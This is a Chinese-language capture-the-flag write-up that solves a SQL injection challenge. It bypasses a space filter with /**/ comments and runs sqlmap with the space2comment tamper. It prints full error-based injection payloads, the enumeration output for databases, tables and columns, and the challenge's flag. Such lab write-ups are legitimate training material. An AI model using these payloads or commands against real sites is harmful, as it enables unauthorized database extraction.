# 简单sql注入3

## 题目

> http://ctf5.shiyanbar.com/web/index_3.php
>
> flag
>
> 到底过滤了什么东西？

分类：sql injection

## 流程图

## 解题步骤

#### 参考文章

无

#### 步骤

##### 0x1 直接猜测法

1. 在文本框输入1，提交，链接变成id=1

2. 在文件框输入1'，提交，报错，判断存在注入

3. 在文本框输入`test`，提交，链接变成id=test，未返回错误，说明该注入类型为字符型注入

4. 使用一下语句：

   ```mysql
   1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'t'='t
   ```

   返回`Hello!`，由于 后台屏蔽了输出，所以只能采用盲注的办法，所以尝试采用sqlmap来实现

##### 0x2 标准注入 

1. 使用sqlmap

```shell
sqlmap.py -u "http://ctf5.shiyanbar.com/web/index_3.php?id=1" --dbs --tamper "space2comment.py" --level 2 -v 3
```

- 参数说明：
  - --dbs 查找所有数据库
  - "space2comment.py" 将空格转换成为/**/
- 获取数据库数量的payload

```mysql
1'/**/AND/**/(SELECT/**/8427/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/IFNULL(CAST(COUNT(schema_name)/**/AS/**/CHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'IUDH'='IUDH
```

返回值：

`Duplicate entry 'qbtfq3qzqpq1' for key 'group_key'`

注意其中的值`3`

- 依次返回三个表的payload

```mysql
1'/**/AND/**/(SELECT/**/8165/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/0,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'xprA'='xprA
[16:35:47] [INFO] retrieved: information_schema
```

返回结果：

### `Duplicate entry 'qbtfqinformation_schemaqzqpq1' for key 'group_key'`

```mysql
[16:35:47] [PAYLOAD] 1'/**/AND/**/(SELECT/**/3904/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/1,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'YvjH'='YvjH
[16:35:48] [INFO] retrieved: test
```

```mysql
[16:35:48] [PAYLOAD] 1'/**/AND/**/(SELECT/**/2380/**/FROM(SELECT/**/COUNT(*),CONCAT(0x7162746671,(SELECT/**/MID((IFNULL(CAST(schema_name/**/AS/**/CHAR),0x20)),1,50)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA/**/LIMIT/**/2,1),0x717a717071,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.CHARACTER_SETS/**/GROUP/**/BY/**/x)a)/**/AND/**/'huJK'='huJK
[16:35:49] [INFO] retrieved: web1
```

以后来研究一下，sqlmap是如何在避过`database()`检测的情况下，实现查询数据库名的

2. 猜解表

   ```shell
   sqlmap.py -u "http://ctf5.shiyanbar.com/web/index_3.php?id=1" -p "id" --thread 10 --dbms=mysql --tables -D "web1"   --tamper "space2comment.py" --level 2 -v 3
   ```

   > [2 tables]
   > +-------+
   > | flag  |
   > | web_1 |
   > +-------+

3. 猜测列

   ```shell
   sqlmap.py -u "http://ctf5.shiyanbar.com/web/index_3.php?id=1" -p "id" --thread 10 --dbms=mysql --columns -T "flag-D "web1"   --tamper "space2comment.py" --level 2 -v 3
   ```

   > | Column |
   > +--------+
   > | flag   | char(30) |
   > | id     |

4. 猜解数据

   ```shell
   sqlmap.py -u "http://ctf5.shiyanbar.com/web/index_3.php?id=1" -p "id" --thread 10 --dbms=mysql --columns -T "flag" -D "web1"   --tamper "space2comment.py" --level 2 -v 3
   ```

   > +----------------------------+
   > | flag                       |
   > +----------------------------+
   > | flag{Y0u_@r3_5O_dAmn_90Od} |
   > +----------------------------+

## 解答思路

1. 判断是否存在注入点
2. 判断注入类型
3. 判断后台的过滤机制
   - 关键字被过滤
     - 重复关键词（例如selectselect），不成功
   - 空格被过滤
     - 使用双重空格（使用+号替代也需要重复两次），不成功
   - 使用/**/替换空格，测试成功
   - 在有错误提示的情况下，可以有针对性的修改注入语句，如果没有错误提示，则需要遍历测试可能的绕过方式
4. 由于返现信息被屏蔽，只能采用盲注，这里使用了sqlmap


## 漏洞挖掘思路

- 无

## 自动化解析

- TODO

- 判断题目特征：`web` `php` `md5` 
- 设定题目难度等级`level`为simple
- 提交相应符合要求的字符串

